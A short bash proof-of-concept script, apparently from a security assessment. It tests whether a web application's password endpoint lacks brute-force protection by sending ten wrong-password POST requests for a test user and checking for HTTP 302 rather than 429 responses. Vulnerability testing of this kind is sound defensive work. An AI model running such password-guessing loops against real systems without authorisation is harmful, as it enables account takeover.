#!/bin/bash

# POC: No Brute Force Protection on Password Endpoint
# This script demonstrates that the /password/{username} endpoint lacks brute force protection
# by sending multiple password attempts and verifying HTTP 302 responses without rate limiting

TARGET="${1:-http://localhost:8080}"
USERNAME="test"
ATTEMPTS=10

echo "[*] Testing brute force protection on ${TARGET}/password/${USERNAME}"
echo "[*] Sending ${ATTEMPTS} consecutive failed password attempts..."
echo ""

# Array to store response codes
declare -a response_codes
declare -a timestamps

for i in $(seq 1 $ATTEMPTS); do
    timestamp=$(date +%s%N)
    response_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        "${TARGET}/password/${USERNAME}" \
        -d "username=${USERNAME}&user_id=10032&password=wrongpass${i}" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    response_codes[$i]=$response_code
    timestamps[$i]=$timestamp
    
    echo "[${i}] Attempt $i: HTTP ${response_code}"
done

echo ""
echo "=== ANALYSIS ==="

# Check if all responses are 302 (indicating no rate limiting)
all_302=true
for i in $(seq 1 $ATTEMPTS); do
    if [ "${response_codes[$i]}" != "302" ]; then
        all_302=false
        break
    fi
done

if [ "$all_302" = true ]; then
    echo "[!] VULNERABILITY CONFIRMED: All $ATTEMPTS attempts returned HTTP 302"
    echo "[!] No rate limiting detected (would expect HTTP 429 or similar)"
    echo "[!] No account lockout detected (would expect different status code)"
    echo "[!] Brute force protection is NOT implemented"
    exit 0
else
    echo "[+] Some rate limiting or protection detected"
    echo "Response codes: ${response_codes[@]}"
    exit 1
fi